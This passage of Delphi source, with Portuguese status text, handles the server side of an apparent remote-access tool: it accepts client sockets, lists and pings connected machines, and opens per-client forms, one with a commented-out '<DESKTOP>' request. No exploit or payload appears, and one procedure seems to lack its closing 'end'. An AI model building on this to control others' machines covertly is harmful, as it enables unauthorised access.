  else if (LV1.Selected.SubItems.Objects[2] as TForm2).Visible = false then
  begin
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
   (LV1.Selected.SubItems.Objects[2] as TForm2).Socket := Socket;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Show;
    //(LV1.Selected.SubItems.Objects[2] as TForm2).Socket.SendText('<DESKTOP>');
  end

end;

procedure TForm1.SS1Accept(Sender: TObject; Socket: TCustomWinSocket);
var
  TST: TSock_Thread;
begin  TST := TSock_Thread.Create(Socket);
  TST.Resume;


end;

procedure TForm1.SS1ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
 //if IpIsBlocked(Form6.Memo1.Lines, Socket.RemoteAddress) then
 begin
 // Socket.Close;
 end;
end;

procedure TForm1.SS1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
 L := LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then
  begin
   Label11.Caption := IntToStr(StrToInt(Label11.Caption) - 1);
    if L.SubItems.Objects[2] <> nil then
    begin
     // if Socket = (L.SubItems.Objects[2] as TForm2).Socket then
      begin
        (L.SubItems.Objects[2] as TForm2).Close;
      end;
    end;
  end;

end;

procedure TForm1.SS1ClientError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
  L := LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then begin
    if L.SubItems.Objects[2] <> nil then begin
  //    if Socket = (L.SubItems.Objects[2] as TForm2).Socket then begin
        (L.SubItems.Objects[2] as TForm2).Close;
      end;
    end;
    L.Delete;
  end;


procedure TForm1.SS1Listen(Sender: TObject; Socket: TCustomWinSocket);
begin
  StatusBar1.Panels.Items[1].Text := 'Aguardando conexões na porta: ' +
    intToStr(SS1.Port);

end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
Hora:String;
Data:String;
begin

Hora := TimeToStr(now);
Data := DateTOStr(now);

Statusbar1.Panels[2].Text := 'Hora: '+Hora+'/'+'Data: '+data;


end;

procedure TForm1.Timer2Timer(Sender: TObject);
var
  i: Integer;
  Socket: TCustomWinSocket;
begin
  try
    for i := 0 to LV1.Items.count - 1 do
    begin
      Socket := TCustomWinSocket(Form1.LV1.Items.Item[i].SubItems.Objects[0]);
      Form1.LV1.Items.Item[i].SubItems.Objects[5] := TObject(GetTickCount);
      Socket.SendText('<|PING|>');
    end;
  except
    Form1.LV1.Items.Delete(i);
  end;

end;

procedure TForm1.Timer3Timer(Sender: TObject);

var
I : Integer;
Palavra: string;
L, L2: TListItem;
begin
 if TimerLigado then
 begin
  Label11.Caption := IntToStr(LV1.Items.Count);
   for I := 0 to LV1.Items.Count-1 do
   begin
    if LV1.Selected.SubItems[5] <> ' ' then
    begin
     TimerLigado := False;
     PopupMenu1.Items[0].Enabled:=True;
     PopupMenu1.Items[2].Enabled:=True;
    end;

    if LV1.Selected.SubItems[5] = ' ' then
    begin
     TimerLigado := False;
     PopupMenu1.Items[0].Enabled:=False;
     PopupMenu1.Items[2].Enabled:=False;
    end;
   end;
 end;
end;

end.
